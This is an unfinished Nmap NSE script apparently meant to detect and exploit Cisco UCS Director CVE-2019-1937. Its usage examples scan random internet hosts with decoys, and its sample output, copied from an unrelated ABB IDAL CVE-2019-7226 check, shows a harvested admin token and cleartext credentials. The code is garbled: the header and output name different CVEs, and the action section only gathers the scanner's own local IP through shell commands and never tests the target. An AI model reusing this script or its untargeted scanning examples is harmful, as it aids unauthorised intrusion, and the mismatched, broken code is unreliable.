---
-- Nmap NSE cisco-cve-2019-1937.nse - Version 1.0
-- Copy to: /usr/share/nmap/scripts/cisco-cve-2019-1937.nse
-- Update NSE database: sudo nmap --script-updatedb
-- execute: nmap --script-help cisco-cve-2019-1937.nse
-- Port(s) accepted by this nse: 80-86,443,8080-8086
--
-- Affected versions: confirmed in Cisco UCS Director versions 6.6.0 and
-- 6.7.0, see [2] for Cisco's list of affected versions
-- POC: https://packetstormsecurity.com/files/154239/Cisco-UCS-IMC-Supervisor-Authentication-Bypass-Command-Injection.html
---

-- SCRIPT BANNER DESCRIPTION --
description = [[

Module Author: r00t-3xp10it

Some Syntax examples:
nmap --script-help cisco-cve-2019-1937.nse
nmap -sV -T4 -Pn -n -p 80-86,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3

]]

---
-- @usage
-- nmap --script-help cisco-cve-2019-1937.nse
-- nmap -sV -T4 -Pn -n -p 80-86,8080 --open --script cisco-cve-2019-1937.nse 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" 137.44.25.194
-- nmap -sV -Pn -n -p 80 --open --script cisco-cve-2019-1937.nse --script-args "uri=/vdeo/cgi/loginDefaultUser,verbose=true" 137.44.25.194
-- nmap -sS -Pn -p 80,86 --open --script cisco-cve-2019-1937.nse --script-args "User-Agent=Apache-HttpClient/4.0.3,verbose=true" 50.117.40.77
-- nmap -sS -v -Pn -n -T4 -iR 700 -p 80-86,8080-8086 --open --script cisco-cve-2019-1937.nse --script-args "verbose=true" -D 65.49.82.3
-- @output
-- PORT     STATE SERVICE VERSION
-- 80/tcp open  http  Apache httpd 2.4.38
-- | cisco-cve-2019-1937:
-- |   VULNERABLE:
-- |   ABB IDAL HTTP server CGI (Improper Authentication)
-- |   State: VULNERABLE
-- |   IDs:  CVE:CVE-2019-7226
-- |   Risk factor: Higth  CVSSv2: 8.8 HIGH (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
-- |     The ABB IDAL HTTP server CGI interface contains a URL that allows an unauthenticated attacker to bypass
-- |     authentication and gain access to privileged functions. Specifically, /cgi/loginDefaultUser creates a session
-- |     in an authenticated state and returns the session ID along with what may be the username and cleartext password
-- |     of the user. An attacker can then supply an IDALToken value in a cookie, which will allow them to perform privileged
-- |     operations such as restarting the service with /cgi/restart. A GET request to /cgi/loginDefaultUser may result in
-- |     '1 #S_OK IDALToken=532c8632b86694f0232a68a0897a145c admin admin' or a similar response.
-- |
-- |   Disclosure date: 2019-Fev-04
-- |   Exploit results:
-- |     Uri: http://192.168.1.71:80/cgi/loginDefaultUser
-- |     Auth-Cookie: IDALToken=008b1047k72068r6100a69b0381d007p
-- |     Credentials: admin : MyS3cr3t
-- |
-- |   Referencies:
-- |     https://nvd.nist.gov/vuln/detail/CVE-2019-7226
-- |     https://www.akaoma.com/ressources/cve/gain-privilege/cve-2019-7226
-- |     https://packetstormsecurity.com/files/153402/ABB-IDAL-HTTP-Server-Authentication-Bypass.html
-- |_
-- @args verbose => Display More verbose outputs      - Default: false
-- @args User-Agent => User-Agent to send in requests - Default: iPhone,safari
-- @args uri => the URL path to search in host.ip     - Default: /cgi/loginDefaultUser
---


author = "r00t-3xp10it"
copyright = "Pedro Ribeiro"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = {"safe", "vuln"}


-- DEPENDENCIES (lua nse libs) --
local http = require "http"
local table = require "table"
local vulns = require "vulns"
local string = require "string"
local stdnse = require "stdnse" --> nse args usage
local shortport = require "shortport"


-- THE RULE SECTION --
-- Scan only the selected ports/proto/service_names in 'open state'
portrule = shortport.port_or_service({80, 81, 82, 83, 84, 85, 86, 443, 8080, 8081, 8082, 8083, 8084, 8085, 8086}, "http, https, http-simple-new, http-proxy", "tcp", "open")


-- THE ACTION SECTION --
action = function(host, port)
--local verbose = stdnse.get_script_args(SCRIPT_NAME..".verbose") or "false"
--local uri = stdnse.get_script_args(SCRIPT_NAME..".uri") or "/cgi/loginDefaultUser"


local ip_addr
-- Capture distro flavor (windows)
local socket = io.popen("ver")
flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
socket.close()

   -- Capture distro flavor (Linux)
   if ( flavor == nil or flavor == "" or string.find(flavor, "not found") ) then
      local socket = io.popen("uname -s")
      flavor = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from OS flavor
      socket.close()
   end


   if (string.find(flavor, "Linux")) then
      -- Executing BASH command(s) and storing results
      -- Storing network interface in use { wlan0 | eth0 }
      local socket = io.popen("netstat -r|grep 'default'|awk {'print $8'}")
      local int_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from interface
      socket:close()

      -- Storing Internal IP address to be used in header['host'] and header['referer']
      local socket = io.popen("ifconfig "..int_addr.."|grep -m 1 'inet'|awk {'print $2'}")
      ip_addr = socket:read("*a"):gsub("\n", "") --> Strip 'new line' from ip addr
      socket:close()
   else
      -- Executing CMD command(s) and storing results
      -- Storing network interface in use { wlan0 | eth0 }
      local socket = io.popen("ipconfig|FINDSTR IPv4")
      ip_addr = socket:read("*a"):gsub("Autoconfiguration IPv4 Address. . : ", "")
      socket.close()
   end



   -- Print Internal ip address captured (develop stage)..
   -- Build header['Referer'] string based on host.ip - port.number
   if (port.number == 443) then
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: https://"..ip_addr.."/\n\n"
   elseif (port.number == 80 or port.number == 8080) then
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: http://"..ip_addr.."/\n\n"
   else
      return "\n Flavor: "..flavor.."\n  Host: "..ip_addr.."\n  Referer: http://"..ip_addr.."/\n\n"
   end
end
